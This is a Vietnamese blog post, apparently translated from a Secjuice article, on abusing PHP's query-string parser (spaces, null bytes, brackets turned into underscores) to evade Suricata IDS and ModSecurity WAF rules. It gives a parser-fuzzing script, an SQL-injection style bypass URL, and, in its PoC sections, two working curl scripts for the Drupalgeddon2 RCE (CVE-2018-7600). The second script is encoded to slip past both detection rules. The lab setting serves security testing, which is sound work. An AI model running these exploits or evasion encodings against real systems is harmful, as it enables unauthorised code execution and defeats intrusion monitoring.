## Mở đầu
- Như bạn đã biết, PHP converts query string (trong URL hoặc body) thành một mảng bên trong `$_GET` hoặc `$_POST`.
- Ví dụ: `/?foo=bar` sẽ trở thành `Array([foo] => "bar")`. Query string parsing sẽ loại bỏ hoặc thay thế một số ký tự trong tên đối số bằng dấu gạch dưới. Ví dụ: `/?%20news[id%00=42` sẽ được chuyển thành `Array([news_id] => 42)`. Nếu IDS/IPS hoặc WAF có rules chặn hoặc ghi nhật ký các giá trị không phải là số trong tham số `news_id` thì có thể bỏ qua bằng cách sử dụng parsing process với nội dung như sau:
    ```php
    /news.php?%20news[id%00=42"+AND+1=0--
    ```
- Trong PHP, giá trị của argument name trong ví dụ trên `%20news[id%00` sẽ được lưu trữ tại `$_GET["news_id"]`.
## Tại sao
- PHP cần chuyển đổi tất cả các đối số thành một tên biến hợp lệ, vì vậy khi chuỗi truy vấn được phân tích, nó thực hiện 2 điều chính:
    - Loại bỏ khoảng trắng ban đầu
    - Chuyển đổi một số ký tự thành dấu gạch dưới (bao gồm cả khoảng trắng)
- Ví dụ
    | USER INPUT	 | DECODED | PHP VARIABLE NAME|
    | -------- | -------- | -------- |
    | %20foo_bar%00	     |   foo_bar	     | foo_bar     |
    | foo%20bar%00	 | foo bar | foo_bar |
    | foo%5bbar	 | foo[bar	 | foo_bar|
- Với một vòng lặp đơn giản như sau, bạn có thể kiểm tra xem ký tự nào bị xóa hoặc chuyển đổi thành dấu gạch dưới bằng cách sử dụng hàm `parser_str`:
 ![](https://images.viblo.asia/c0190f89-5e0a-4810-9160-c2013dc92e02.gif)
    ```php
    <?php

        foreach(
            [
                "{chr}foo_bar",
                "foo{chr}bar",
                "foo_bar{chr}"
            ] as $k => $arg) {

                for($i=0;$i<=255;$i++) {
                    echo "\033[999D\033[K\r";
                    echo "[".$arg."] check ".bin2hex(chr($i))."";
                    parse_str(str_replace("{chr}",chr($i),$arg)."=bla",$o);

                    /* yes... I've added a sleep time on each loop just for 
                    the scenic effect :) like that movie with unrealistic 
                    brute-force where the password are obtained 
                    one byte at a time (∩｀-´)⊃━☆ﾟ.*･｡ﾟ 
                    */
                    usleep(5000);

                    if(isset($o["foo_bar"])) {
                        echo "\033[999D\033[K\r";
                        echo $arg." -> ".bin2hex(chr($i))." (".chr($i).")\n";
                    }
                }

                echo "\033[999D\033[K\r";
                echo "\n";
        }
    ```
    ![](https://images.viblo.asia/6ee7cd06-ff19-4578-acd0-f325c9b292ff.gif)
    
- `pasrse_str` được sử dụng qua GET, POST và cookie. Cũng tương tự với các tiêu đề nếu server web của bạn chấp nhận tên tiêu đề có dấu chấm hoặc khoảng trắng. Tôi đã thực hiện 3 lần vòng lặp ở trên, liệt kê tất cả các kí tự ascii từ 0 đến 255 ở cả 2 đầu của tên tham số và thay vì dấu gạch dưới, đây là kết quả thu được:
    - [1st]foo_bar
    - foo[2nd]bar
    - foo_bar[3rd]
 ![](https://images.viblo.asia/6d3ab218-f9f2-4d87-aa78-505971e0036d.png)
 ![](https://images.viblo.asia/f61e7348-c6b6-4dc4-93a7-ffb405cfd0ba.png)
 - Trong sơ đồ trên, `foo%20bar` và `foo+bar` là  tương đương với `foo bar`.
## Suricata
- Đối với những người k biết, Suricata là "một công cụ phát hiện mối đe dọa mã nguồn mở, nhanh và mạnh mẽ" và công cụ của nó có khả năng phát hiện xâm nhập thời gian thực (IDS), hệ thống ngăn ngừa xâm nhập (IPS), giám sát an ninh mạng (NSM) và xử lý pcap ngoại tuyến. 
- Với Suricata, bạn có thể viết 1 rule kiểm tra HTTP traffic. Giả sử bạn viết 1 rule:
    ```bash
    alert http any any -> $HOME_NET any (\
        msg: "Block SQLi"; flow:established,to_server;\
        content: "POST"; http_method;\
        pcre: "/news_id=[^0-9]+/Pi";\
        sid:1234567;\
    )
    ```
- Rule kiểm tra nếu `news_id` có một giá trị không phải là số. Trong PHP nó có thể dễ dàng bypass sử dụng trình phân tích cú pháp chuỗi truy vấn của nó, giống như vài ví dụ sau đây:

    ![](https://images.viblo.asia/c4004744-3e4a-4952-ac76-38c92092c195.png)
- Tìm kiếm trên google và github, tôi tìm thấy rằng có nhiều quy tắc Suricata cho PHP có thể  được bỏ qua bằng cách thay thế dấu gạch dưới, thêm byte rỗng hoặc khoảng trắng trong tên đối số được kiểm tra. Một ví dụ thực tế:
![](https://images.viblo.asia/7e9a56ed-f3fe-40ab-a12b-49360f2c60cf.png)
- Như chúng ta đã thấy, nó có thể bỏ qua bởi 
    ```
    /view.php?i%00=1&%20key=d3b07384d113edec49eaa6238ad5ff00
    ```
- Có thể thay vị trí đối số như 
    ```
    /view.php?key=d3b07384d113edec49eaa6238ad5ff00&i=1
    ```
## WAF (ModSecurity)
- PHP query string paser cũng có thể bị sử dụng để bỏ qua các quy tắc của WAF. Hãy tưởng tượng một quy tắc ModSecurty như `SecRule! !ARGS:news_id "@rx ^[0-9]+$" "block"` thiên về bypass technique. May mắn thay, trong ModSecurity bạn chỉ có thể chỉ định 1 query string bằng một REGEX. Ví dụ:
    ```
    SecRule !ARGS:/news.id/ "@rx ^[0-9]+$" "block"
    ```
  Điều này sẽ chặn các yêu cầu sau: 
  
 ![](https://images.viblo.asia/fac7c66b-2a3e-472d-8cf9-b2c1868ffb0d.png)

## PoC || GTFO
- Bây giờ tôi có thể tạo PoC với Suricata và Drupal CMS với exploit CVE-2018-7600 (Drupalgeddon2 Remote Code Execution). Để đơn giản hơn, tôi sẽ chạy Suricata và Drupal trên 2 con container docker và tôi sẽ cố gắng khai thác Drupal từ container Suricata.
- Tôi sẽ active 2 rules bên Suricata:
    - A custom rule that blocks form_id=user_register_form
    - A Positive Technologies Suricata rule for CVE-2018-7600
![](https://images.viblo.asia/9e49d51c-d7c9-4e1a-a269-8c700b4eb86c.png)
- Để cài đặt Suricata, tôi đã làm theo hướng dẫn ở trên trang chủ, và đối với Drupal, tôi đã chạy vulhub mà bạn có thể clone ở đây: [Vulhub Drupal](https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600)

![](https://images.viblo.asia/3adbc7f9-4c3c-43b6-a468-3222472a05f3.png)
- Ok rồi, tất cả đã xong, giờ mình có thể sử dụng exploit CVE-2018-7600. Tôi muốn tạo một số bash script mà thực hiện curl, ví dụ:
    ```bash
    #!/bin/bash

    URL="/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    QSTRING="form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]="
    COMMAND="id"

    curl -v -d "${QSTRING}${COMMAND}" "http://172.17.0.1:8080$URL"
    ```
    Như bạn có thể thấy, đoạn script trên thực thi lệnh "id". Thử nó xem nào
    ![](https://images.viblo.asia/16ad9702-3d18-478b-aacd-a44b73a0b302.png)
- Nào, bây giờ thử import 2 rules vào Suricata. Tôi đã viết cái đầu tiên, và nó cố gắng khớp `form_id=user_register_form` vào bên trong 1 request body. Cố gắng viết 1 cái thứ 2 `/user/register` trong request URL và nó trông giống như `#post_render` trong request body.
- My rule: 

![](https://images.viblo.asia/3b14a8e9-3b8a-4f44-bff8-e1ea566fdeda.png)
- PT rule:

![](https://images.viblo.asia/e7f49ff9-ab01-4601-89f2-ca08c02c4c71.png)
- Sau đó restart Suricata, tôi đã sẵn sang để khai khác xem liệu 2 quy tắc trên có chặn được việc khai thác của tôi không.
![](https://images.viblo.asia/e88f7de7-e11b-43df-8dcd-7c40de01f077.gif)

- Úi trời, tôi đã có 2 bản ghi Suricata:
    - ATTACK [PTsecurity] Drupalgeddon2 <8.3.9 <8.4.6 <8.5.1 RCE through registration form (CVE-2018-7600) [Priority: 1] {PROTO:006} 172.17.0.6:51702 -> 172.17.0.1:8080
    - Possible Drupalgeddon2 attack [Priority: 3] {PROTO:006} 172.17.0.6:51702 -> 172.17.0.1:
## Bypass all the things!
- Cả 2 quy tắc này dễ dàng để bypass. Tôi đã thấy được làm thế nào để bypass rule của tôi với việc lạm dụng PHP query string parser. Tôi có thể thay thế `form_id=user_register_form` bằng một vài thứ khác như:
    ```
    form%5bid=user_register_form
    ```
    ![](https://images.viblo.asia/ca283457-b755-455b-9eae-5789893fece5.gif)
- Như bạn có thể thấy được, chỉ có quy tắc PT là phù hợp. Phân tích PT, chúng ta thấy rằng nó khớp với # và phiên bản được mã hóa %23. Chúng ta chỉ có thể bypass bằng cách sử dụng post%5frender thay vì post_render.
    ![](https://images.viblo.asia/ee7cc544-09e7-410b-a731-4ffcedb1c64e.gif)
- Cả 2 rules đã được bỏ qua bởi exploit sau:
    ```bash
    #!/bin/bash

    URL="/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    QSTRING="form%5bid=user_register_form&_drupal_ajax=1&mail[#post%5frender][]=exec&mail[#type]=markup&mail[#markup]="
    COMMAND="id"

    curl -v -d "${QSTRING}${COMMAND}" "http://172.17.0.1:8080$URL"
    ```
## Tổng kết
- Nếu các bạn cảm thấy bài viết hay và có ích, mình xin 1 upvote và 1 share nhé :D
- Nguồn: https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/